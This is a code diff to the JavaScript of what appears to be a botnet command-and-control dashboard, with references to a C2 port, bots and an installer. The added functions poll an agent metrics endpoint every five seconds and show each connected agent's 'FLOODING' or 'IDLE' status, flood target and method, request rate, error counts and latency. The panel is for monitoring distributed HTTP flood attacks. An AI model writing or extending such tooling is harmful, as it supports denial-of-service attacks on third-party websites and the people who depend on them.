@@ -15,6 +15,8 @@ document.addEventListener('DOMContentLoaded', () => {
     setInterval(checkProxy, 10000);
     fetchBots();
     setInterval(fetchBots, 15000);
+    fetchAgentMetrics();
+    setInterval(fetchAgentMetrics, 5000);
     // Pre-fill installer port from current page URL
     const portHint = location.port || '5000';
     const cp = document.getElementById('c2-port');
@@ -303,6 +305,55 @@ function renderAgentResults() {
 function clearAgentResults() {
     agentResults = [];
     renderAgentResults();
+}
+
+/* ── Live agent metrics (polls /api/agent/metrics every 5s) ───── */
+async function fetchAgentMetrics() {
+    try {
+        const r = await fetch('/api/agent/metrics');
+        const d = await r.json();
+        renderAgentMetrics(d.metrics || []);
+    } catch {}
+}
+
+function renderAgentMetrics(metrics) {
+    const tb = document.getElementById('agent-metrics-body');
+    if (!tb) return;
+    if (!metrics.length) {
+        tb.innerHTML = '<tr><td colspan="10" class="muted-cell">No agents connected</td></tr>';
+        return;
+    }
+    const now = Date.now() / 1000;
+    tb.innerHTML = metrics.map(m => {
+        const ago    = Math.round(now - (m.last_seen || 0));
+        const active = m.flood_active === 1;
+        const statusBadge = active
+            ? '<span style="background:#dcfce7;color:#15803d;font-size:.7rem;font-weight:700;padding:2px 8px;border-radius:10px">FLOODING</span>'
+            : '<span style="background:#f1f5f9;color:#94a3b8;font-size:.7rem;font-weight:700;padding:2px 8px;border-radius:10px">IDLE</span>';
+        const target = m.flood_target
+            ? `<span style="font-family:monospace;font-size:.75rem;color:#6366f1">${m.flood_method} ${m.flood_target.replace(/^https?:\/\//,'').slice(0,30)}</span>`
+            : '<span style="color:#94a3b8">—</span>';
+        const rpsColor = active && m.rps_current > 0 ? '#6366f1' : '#94a3b8';
+        const p50Color = m.latency_p50_ms > 500 ? '#f59e0b' : '#334155';
+        const p99Color = m.latency_p99_ms > 1000 ? '#ef4444' : '#334155';
+        const agentShort = (m.agent_id || '').replace('agent-', '');
+        // Prometheus link
+        const promLink = m.metrics_port
+            ? `<a href="http://${m.ip}:${m.metrics_port || 9100}/metrics" target="_blank" class="btn-link" style="font-size:.75rem">:${m.metrics_port || 9100}</a>`
+            : '<span style="color:#94a3b8;font-size:.75rem">—</span>';
+        return `<tr>
+            <td style="font-family:monospace;font-size:.78rem"><span title="${m.agent_id}">${agentShort}</span><br><span style="color:#94a3b8;font-size:.72rem">${m.hostname || m.ip}</span></td>
+            <td>${statusBadge}</td>
+            <td>${target}</td>
+            <td style="color:${rpsColor};font-weight:700">${active ? m.rps_current.toFixed(1) : '—'}</td>
+            <td>${(+m.requests_total).toLocaleString()}</td>
+            <td style="color:#16a34a">${(+m.requests_success).toLocaleString()}</td>
+            <td style="color:#dc2626">${(+m.requests_errors).toLocaleString()}</td>
+            <td style="color:${p50Color}">${m.latency_p50_ms > 0 ? m.latency_p50_ms.toFixed(0) : '—'}</td>
+            <td style="color:${p99Color}">${m.latency_p99_ms > 0 ? m.latency_p99_ms.toFixed(0) : '—'}</td>
+            <td>${promLink}</td>
+        </tr>`;
+    }).join('');
 }
 
 /* ── Charts ───────────────────────────────────────────────────── */
